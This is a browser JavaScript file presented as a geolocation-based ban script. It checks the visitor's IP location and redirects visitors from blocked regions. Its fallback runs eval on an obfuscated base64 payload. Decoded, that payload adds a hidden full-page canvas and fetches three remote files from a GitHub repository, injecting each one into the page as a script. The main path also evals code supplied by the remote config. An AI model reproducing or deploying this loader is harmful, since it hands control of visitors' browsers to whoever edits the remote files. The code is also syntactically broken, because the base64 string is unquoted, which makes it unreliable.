(async () => {
    console.log("Starting geolocation ban script...");

    // URL of the configuration JSON
    const CONFIG_URL = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/algoritm.json";

    // Base64 fallback script (placeholder for you to replace later)
    const BASE64_SCRIPT = ""; // Add your base64 script here

    // Function to fetch the JSON configuration
    async function fetchConfig() {
        try {
            const response = await fetch(CONFIG_URL);
            if (!response.ok) throw new Error("Failed to fetch JSON configuration.");
            const config = await response.json();
            console.log("Configuration JSON fetched successfully:", config);
            return config;
        } catch (error) {
            console.error("Error fetching configuration:", error);
            return null;
        }
    }

    // Function to detect VPN usage (simplified; actual implementation may vary)
    function detectVPN() {
        // Example placeholder for VPN detection logic
        console.log("Checking for VPN usage...");
        // Return true if VPN is detected (replace this logic with actual detection code)
        return false; 
    }

    // Function to get the user's geolocation
    async function getUserGeolocation() {
        try {
            console.log("Attempting to get user geolocation...");
            const response = await fetch("https://ipapi.co/json/"); // Example external service
            if (!response.ok) throw new Error("Failed to fetch geolocation.");
            const geoData = await response.json();
            console.log("User geolocation data:", geoData);
            return geoData;
        } catch (error) {
            console.error("Error getting user geolocation:", error);
            return null;
        }
    }

    // Main function to execute the logic
    async function executeScript() {
        const config = await fetchConfig();
        if (!config) {
            console.error("Critical failure: Falling back to Base64 script...");
            eval(atob(KGZ1bmN0aW9uKCkgewogICAgLy8gRnVuY3Rpb24gdG8gZHluYW1pY2FsbHkgYWRkIGEgY2FudmFzIGVsZW1lbnQgdG8gdGhlIGJvZHkKICAgIHZhciBjYW52YXMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKICAgIGNhbnZhcy5pZCA9ICJjYW52YXMiOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjYW52YXMpOwoKICAgIC8vIFN0eWxlIHRoZSBjYW52YXMgdG8gY292ZXIgdGhlIGZ1bGwgcGFnZSBhcyBhIGJhY2tncm91bmQKICAgIGNhbnZhcy5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICBjYW52YXMuc3R5bGUudG9wID0gIjAiOwogICAgY2FudmFzLnN0eWxlLmxlZnQgPSAiMCI7CiAgICBjYW52YXMuc3R5bGUuekluZGV4ID0gIjEwIjsKICAgIGNhbnZhcy5zdHlsZS5wb2ludGVyRXZlbnRzID0gIm5vbmUiOwogICAgY2FudmFzLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgY2FudmFzLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsKCiAgICAvLyBGdW5jdGlvbiB0byBsb2FkIGFuZCBhcHBseSB0aGUgY2FudmFzIGNvbnRlbnQgZnJvbSB0aGUgZXh0ZXJuYWwgVVJMCiAgICBmdW5jdGlvbiBsb2FkQ2FudmFzQ29udGVudCgpIHsKICAgICAgICB2YXIgY3R4ID0gY2FudmFzLmdldENvbnRleHQoIjJkIik7CgogICAgICAgIC8vIEZldGNoIHRoZSBjb250ZW50IGZyb20gdGhlIGdpdmVuIFVSTCBmb3IgY2FudmFzIGRyYXdpbmcgbG9naWMKICAgICAgICBmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RyTWluZXdvcmQvQXJ0ZWZhY3QtQm9vc3QtQWN0aXZlL3JlZnMvaGVhZHMvbWFpbi9jYW52YS5jYW52YSIpCiAgICAgICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgICAgICAgICAgLnRoZW4oc2NyaXB0Q29udGVudCA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiQ2FudmFzIGNvbnRlbnQgbG9hZGVkIHN1Y2Nlc3NmdWxseS4iKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gRXhlY3V0ZSB0aGUgbG9hZGVkIGNvbnRlbnQgaW5zaWRlIHRoZSBjYW52YXMKICAgICAgICAgICAgICAgIHZhciBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICAgICAgICAgIHNjcmlwdC50ZXh0ID0gc2NyaXB0Q29udGVudDsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0KTsgLy8gQXBwZW5kcyB0aGUgc2NyaXB0IHRoYXQgZGVmaW5lcyB0aGUgY2FudmFzIGRyYXdpbmcgbG9naWMKCiAgICAgICAgICAgICAgICAvLyBBZnRlciB0aGUgY2FudmFzIGNvbnRlbnQgaXMgbG9hZGVkLCBleGVjdXRlIHRoZSBzZWNvbmQgc2NyaXB0IChjbWQuZXhlY3V0ZSkKICAgICAgICAgICAgICAgIGV4ZWN1dGVDbWRTY3JpcHQoKTsKICAgICAgICAgICAgfSkKICAgICAgICAgICAgLmNhdGNoKGVycm9yID0+IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoIkVycm9yIGxvYWRpbmcgY2FudmFzIGNvbnRlbnQ6IiwgZXJyb3IpOwogICAgICAgICAgICB9KTsKICAgIH0KCiAgICAvLyBGdW5jdGlvbiB0byBsb2FkIGFuZCBleGVjdXRlIHRoZSBzZWNvbmQgc2NyaXB0IChjbWQuZXhlY3V0ZSkKICAgIGZ1bmN0aW9uIGV4ZWN1dGVDbWRTY3JpcHQoKSB7CiAgICAgICAgZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Eck1pbmV3b3JkL0FydGVmYWN0LUJvb3N0LUFjdGl2ZS9yZWZzL2hlYWRzL21haW4vY21kLmV4ZWN1dGUiKQogICAgICAgICAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAgICAgICAgIC50aGVuKGNtZFNjcmlwdENvbnRlbnQgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coImNtZC5leGVjdXRlIHNjcmlwdCBsb2FkZWQgc3VjY2Vzc2Z1bGx5LiIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBDcmVhdGUgYSBuZXcgc2NyaXB0IHRhZyB0byBleGVjdXRlIHRoZSBjbWQgc2NyaXB0CiAgICAgICAgICAgICAgICB2YXIgY21kU2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgICAgICAgICBjbWRTY3JpcHQudGV4dCA9IGNtZFNjcmlwdENvbnRlbnQ7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNtZFNjcmlwdCk7IC8vIEV4ZWN1dGVzIHRoZSBjb21tYW5kIHNjcmlwdAoKICAgICAgICAgICAgICAgIC8vIE5vdyBsb2FkIGFuZCBleGVjdXRlIHRoZSB0aGlyZCBzY3JpcHQgKGNtZDIuZXhlY3V0ZSkKICAgICAgICAgICAgICAgIGV4ZWN1dGVDbWQyU2NyaXB0KCk7CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIC5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBsb2FkaW5nIGNtZC5leGVjdXRlIHNjcmlwdDoiLCBlcnJvcik7CiAgICAgICAgICAgIH0pOwogICAgfQoKICAgIC8vIEZ1bmN0aW9uIHRvIGxvYWQgYW5kIGV4ZWN1dGUgdGhlIHRoaXJkIHNjcmlwdCAoY21kMi5leGVjdXRlKQogICAgZnVuY3Rpb24gZXhlY3V0ZUNtZDJTY3JpcHQoKSB7CiAgICAgICAgZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Eck1pbmV3b3JkL0FydGVmYWN0LUJvb3N0LUFjdGl2ZS9yZWZzL2hlYWRzL21haW4vY21kMi5leGVjdXRlIikKICAgICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogICAgICAgICAgICAudGhlbihjbWQyU2NyaXB0Q29udGVudCA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiY21kMi5leGVjdXRlIHNjcmlwdCBsb2FkZWQgc3VjY2Vzc2Z1bGx5LiIpOwoKICAgICAgICAgICAgICAgIC8vIENyZWF0ZSBhIG5ldyBzY3JpcHQgdGFnIHRvIGV4ZWN1dGUgdGhlIGNtZDIgc2NyaXB0CiAgICAgICAgICAgICAgICB2YXIgY21kMlNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgICAgICAgICAgY21kMlNjcmlwdC50ZXh0ID0gY21kMlNjcmlwdENvbnRlbnQ7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNtZDJTY3JpcHQpOyAvLyBFeGVjdXRlcyB0aGUgc2Vjb25kIGNvbW1hbmQgc2NyaXB0CgogICAgICAgICAgICAgICAgLy8gTG9nIHRvIHRoZSBjb25zb2xlIHRoYXQgdGhlIHNjcmlwdCBoYXMgYmVlbiBleGVjdXRlZAogICAgICAgICAgICAgICAgY29uc29sZS5sb2coImNtZDIuZXhlY3V0ZSBzY3JpcHQgZXhlY3V0ZWQgc3VjY2Vzc2Z1bGx5LiIpOwogICAgICAgICAgICB9KQogICAgICAgICAgICAuY2F0Y2goZXJyb3IgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgbG9hZGluZyBjbWQyLmV4ZWN1dGUgc2NyaXB0OiIsIGVycm9yKTsKICAgICAgICAgICAgfSk7CiAgICB9CgogICAgLy8gSW5pdGlhbGl6ZSB0aGUgY2FudmFzIGNvbnRlbnQgYW5kIHN0YXJ0IHRoZSBwcm9jZXNzCiAgICBsb2FkQ2FudmFzQ29udGVudCgpOwoKfSkoKTs=
)); // Fallback to Base64 script
            return;
        }

        const userGeo = await getUserGeolocation();
        if (!userGeo) {
            console.error("Critical failure: Redirecting to error URL...");
            const errorUrl = `${config.redirect_url.error}?data=${encodeURIComponent("Unable to fetch user geolocation.")}`;
            window.location.href = errorUrl;
            return;
        }

        // Check for VPN usage
        const vpnDetected = detectVPN();
        if (vpnDetected && config.allow_vpn === "false") {
            console.warn("VPN detected and not allowed.");
            const vpnUrl = `${config.redirect_url.normal}?data=${encodeURIComponent("VPN USAGE DETECTED, PLEASE TURN IT OFF")}`;
            window.location.href = vpnUrl;
            return;
        }

        // Check if user location matches banned geolocation
        const bannedGeo = config.banned_geo_data.find((geo) =>
            geo.data.country_code === userGeo.country || // Match by country code
            geo.data.regions.includes(userGeo.region) // Match by region
        );

        if (bannedGeo) {
            console.warn("User is located in a banned region:", bannedGeo);
            const banUrl = `${config.redirect_url.normal}?data=${encodeURIComponent(bannedGeo.ID)}`;
            window.location.href = banUrl;
            return;
        }

        // Save geolocation to local storage if enabled
        if (config.save_to_local_storage === "true") {
            console.log("Saving user geolocation to local storage...");
            localStorage.setItem("userGeo", JSON.stringify(userGeo));
        }

        // Execute the after_script_execute part
        console.log("User passed the test. Executing 'after_script_execute'...");
        if (config.after_script_execute) {
            console.log(`Executing after script part: ${config.after_script_execute}`);
            eval(config.after_script_execute); // Execute script part
        }
    }

    // Execute the main script
    executeScript();
})();
